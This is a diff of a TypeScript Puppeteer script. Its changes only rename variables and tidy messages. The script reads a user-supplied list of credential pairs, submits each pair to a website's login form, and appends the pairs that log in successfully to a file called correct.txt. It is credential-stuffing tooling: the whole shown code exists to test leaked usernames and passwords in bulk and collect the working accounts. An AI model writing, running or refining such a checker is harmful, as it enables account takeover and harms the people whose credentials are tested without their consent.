@@ -12,8 +12,8 @@ async function processar () {
    output: process.stdout  
  })
 
- inputScan.question("DIGIT YOUR LIST.TXT: ", async function(awser: any){
-  var archive = fs.readFileSync(`${awser}`, 'utf-8')
+ inputScan.question("DIGIT YOUR LIST.TXT: ", async function(awnser: any){
+  var archive = fs.readFileSync(`${awnser}`, 'utf-8')
   inputScan.close()
   var lines = archive.split(/\r?\n/)
  
@@ -41,14 +41,14 @@ async function processar () {
             await page.click('[class="submit"]')
             await page.waitForTimeout(1000)
           
-          let clicar =  await page.waitForSelector('[id="loginError"]', {visible: true});
-           if (clicar) {
+          let error =  await page.waitForSelector('[id="loginError"]', {visible: true});
+           if (error) {
              console.log('\x1b[31m', "Credentials Error")
            }
           } catch (warning) {            
             fs.appendFile('correct.txt', `${newline[0]}, ${newline[1]}, '\n\r'`, function (err:any) {
               if (err) throw err;
-              console.log('\x1b[32m', 'Credentials Correct!!!' + warning);
+              console.log('\x1b[32m', 'Credentials Correct!' + warning);
             })
           }
           await browser.close()
